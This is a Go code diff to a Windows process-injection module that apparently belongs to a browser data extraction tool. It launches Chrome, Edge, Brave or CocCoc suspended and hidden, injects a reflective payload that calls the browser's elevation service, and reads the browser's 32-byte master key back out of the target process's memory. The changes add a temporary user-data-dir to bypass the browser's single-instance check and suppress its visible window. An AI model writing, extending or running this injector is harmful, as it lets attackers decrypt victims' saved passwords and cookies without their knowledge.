@@ -47,10 +47,11 @@ func (r *Reflective) Inject(exePath string, payload []byte, env map[string]strin
 	restore := setEnvTemporarily(env)
 	defer restore()
 
-	pi, err := spawnSuspended(exePath)
+	pi, udd, err := spawnSuspended(exePath)
 	if err != nil {
 		return nil, err
 	}
+	defer os.RemoveAll(udd)
 	defer windows.CloseHandle(pi.Process)
 	defer windows.CloseHandle(pi.Thread)
 
@@ -67,9 +68,9 @@ func (r *Reflective) Inject(exePath string, payload []byte, env map[string]strin
 		return nil, err
 	}
 
-	// Resume briefly so ntdll loader init completes before we hijack a thread;
-	// Bootstrap itself is self-contained but the later elevation_service COM
-	// call inside the payload relies on a fully-initialized PEB.
+	// Resume briefly so ntdll loader init completes before we hijack a thread; Bootstrap itself is
+	// self-contained but the later elevation_service COM call inside the payload relies on a
+	// fully-initialized PEB.
 	_, _ = windows.ResumeThread(pi.Thread)
 	time.Sleep(500 * time.Millisecond)
 
@@ -97,9 +98,8 @@ func (r *Reflective) Inject(exePath string, payload []byte, env map[string]strin
 	return result.Key, nil
 }
 
-// scratchResult is the structured view of the 12-byte diagnostic header
-// (marker..com_err) plus the optional 32-byte master key the payload
-// publishes back into the remote process's scratch region.
+// scratchResult is the structured view of the 12-byte diagnostic header (marker..com_err) plus the
+// optional 32-byte master key the payload publishes back into the remote process's scratch region.
 type scratchResult struct {
 	Marker  byte
 	Status  byte
@@ -131,22 +131,61 @@ func validateAndLocateLoader(payload []byte) (uint32, error) {
 	return off, nil
 }
 
-func spawnSuspended(exePath string) (*windows.ProcessInformation, error) {
+// buildIsolatedCommandLine builds the command-line for a spawned, singleton-isolated Chromium process.
+// Two upstream Chromium switches:
+//   - --user-data-dir=<temp>: escape the running browser's ProcessSingleton mutex so the suspended
+//     child survives past main() long enough for the remote Bootstrap thread to complete (issue #576).
+//   - --no-startup-window: suppress the brief UI splash that Edge/Brave/CocCoc paint despite
+//     STARTF_USESHOWWINDOW+SW_HIDE (which Chrome honors but brand-forked startup code often ignores).
+//
+// Adding other flags (--disable-extensions, --disable-gpu, ...) has destabilized Brave in the past
+// (payload dies inside DllMain with marker=0x0b); both switches here are upstream-official and safe.
+func buildIsolatedCommandLine(exePath, udd string) string {
+	return fmt.Sprintf(`"%s" --user-data-dir="%s" --no-startup-window`, exePath, udd)
+}
+
+// spawnSuspended launches exePath in a fully isolated suspended state. A unique --user-data-dir is
+// passed so the spawned chrome.exe does not collide with any already-running Chrome instance's
+// ProcessSingleton (which would call ExitProcess as soon as main() runs, killing our remote Bootstrap
+// thread before it can publish the master key). The temp UDD is returned so the caller can remove it
+// after injection.
+func spawnSuspended(exePath string) (*windows.ProcessInformation, string, error) {
+	udd, err := os.MkdirTemp("", "hbd-inj-udd-*")
+	if err != nil {
+		return nil, "", fmt.Errorf("injector: make temp user-data-dir: %w", err)
+	}
+
+	cmdLine := buildIsolatedCommandLine(exePath, udd)
+	cmdPtr, err := syscall.UTF16PtrFromString(cmdLine)
+	if err != nil {
+		_ = os.RemoveAll(udd)
+		return nil, "", fmt.Errorf("injector: command line: %w", err)
+	}
 	exePtr, err := syscall.UTF16PtrFromString(exePath)
 	if err != nil {
-		return nil, fmt.Errorf("injector: exe path: %w", err)
+		_ = os.RemoveAll(udd)
+		return nil, "", fmt.Errorf("injector: exe path: %w", err)
 	}
-	si := &windows.StartupInfo{}
+	// STARTF_USESHOWWINDOW + SW_HIDE asks the child to honor our ShowWindow value on its first
+	// CreateWindow/ShowWindow call — a standard way to suppress the brief Chrome splash window that
+	// otherwise flashes because the UDD bypass makes the injected process proceed to the "I am the
+	// primary instance" branch and start painting UI before we TerminateProcess it.
+	si := &windows.StartupInfo{
+		Flags:      windows.STARTF_USESHOWWINDOW,
+		ShowWindow: windows.SW_HIDE,
+	}
 	pi := &windows.ProcessInformation{}
-	if err := windows.CreateProcess(
-		exePtr, nil, nil, nil,
+	err = windows.CreateProcess(
+		exePtr, cmdPtr, nil, nil,
 		false,
 		windows.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW,
 		nil, nil, si, pi,
-	); err != nil {
-		return nil, fmt.Errorf("injector: CreateProcess: %w", err)
+	)
+	if err != nil {
+		_ = os.RemoveAll(udd)
+		return nil, "", fmt.Errorf("injector: CreateProcess: %w", err)
 	}
-	return pi, nil
+	return pi, udd, nil
 }
 
 func writeRemotePayload(proc windows.Handle, payload []byte) (uintptr, error) {
@@ -191,13 +230,12 @@ func runAndWait(proc windows.Handle, remoteBase uintptr, loaderRVA uint32, wait 
 	}
 }
 
-// readScratch pulls the payload's diagnostic header and (on success) the
-// master key out of the target process's scratch region. A non-nil error
-// means our own ReadProcessMemory call failed (distinct from the payload
-// reporting a structured failure via result.Status/ErrCode/HResult).
+// readScratch pulls the payload's diagnostic header and (on success) the master key out of the target
+// process's scratch region. A non-nil error means our own ReadProcessMemory call failed (distinct from
+// the payload reporting a structured failure via result.Status/ErrCode/HResult).
 func readScratch(proc windows.Handle, remoteBase uintptr) (scratchResult, error) {
-	// hdr covers offsets 0x28..0x33: marker, status, extract_err_code,
-	// _reserved, hresult (LE u32), com_err (LE u32).
+	// hdr covers offsets 0x28..0x33: marker, status, extract_err_code, _reserved, hresult (LE u32),
+	// com_err (LE u32).
 	var hdr [12]byte
 	var n uintptr
 	if err := windows.ReadProcessMemory(proc,
@@ -232,10 +270,9 @@ func readScratch(proc windows.Handle, remoteBase uintptr) (scratchResult, error)
 	return result, nil
 }
 
-// patchPreresolvedImports writes five pre-resolved Win32 function pointers
-// into the payload's DOS stub so Bootstrap skips PEB.Ldr traversal entirely.
-// Validity relies on KnownDlls + session-consistent ASLR (kernel32 and ntdll
-// share the same virtual address across processes in one boot session).
+// patchPreresolvedImports writes five pre-resolved Win32 function pointers into the payload's DOS stub
+// so Bootstrap skips PEB.Ldr traversal entirely. Validity relies on KnownDlls + session-consistent
+// ASLR (kernel32 and ntdll share the same virtual address across processes in one boot session).
 func patchPreresolvedImports(payload []byte) ([]byte, error) {
 	if len(payload) < bootstrap.ImpNtFlushICOffset+8 {
 		return nil, fmt.Errorf("injector: payload too small for pre-resolved import patch")
@@ -267,8 +304,8 @@ func patchPreresolvedImports(payload []byte) ([]byte, error) {
 	return patched, nil
 }
 
-// setEnvTemporarily mutates the current process's env; NOT concurrency-safe.
-// Callers must serialize Inject calls.
+// setEnvTemporarily mutates the current process's env; NOT concurrency-safe. Callers must serialize
+// Inject calls.
 func setEnvTemporarily(env map[string]string) func() {
 	if len(env) == 0 {
 		return func() {}
